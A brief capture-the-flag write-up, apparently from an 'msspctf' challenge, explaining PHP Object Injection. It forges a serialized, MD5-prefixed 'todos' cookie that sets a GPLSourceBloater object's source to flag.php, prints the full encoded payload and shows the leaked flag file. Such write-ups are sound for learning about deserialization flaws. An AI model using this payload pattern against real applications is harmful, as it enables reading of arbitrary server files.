@@ -1,0 +1,40 @@
+This is a prime example for PHP Object Injection. In this case it was not necessary to dig deeper into PHP internal classes, since the class in need was conveniently already present; the class used to display the source 
+
+
+<?php
+Class GPLSourceBloater{
+    public function __toString()
+    {
+        return highlight_file('license.txt', true).highlight_file($this->source, true);
+    }
+}
+?>
+
+
+
+So we need to build a GPLSourceBloater object, set its source attribute to the desired file (flag.php) and serialize it.
+
+after a post I get cookie like setcookie(‘todos’, $md5($m).$m); #m is serialize category.
+
+
+To construct a GPLSourceBloater Object, I design cookie like serialize an object
+
+and must have ‘this->source=”flag.php”‘ element.
+
+it must be an array of object to print this source.
+
+Cookie name : todos
+Value : dd0216616f68a33acd7e3817e02fd4d5a%3A1%3A%7Bi%3A1%3BO%3A16%3A%22GPLSourceBloater%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D
+
+
+Reload the page and you found
+
+<?php
+
+$flag = "msspctf{serialization_bugs}";
+
+echo "Stupid Hacker";
+?>
+
+
+And I get flag
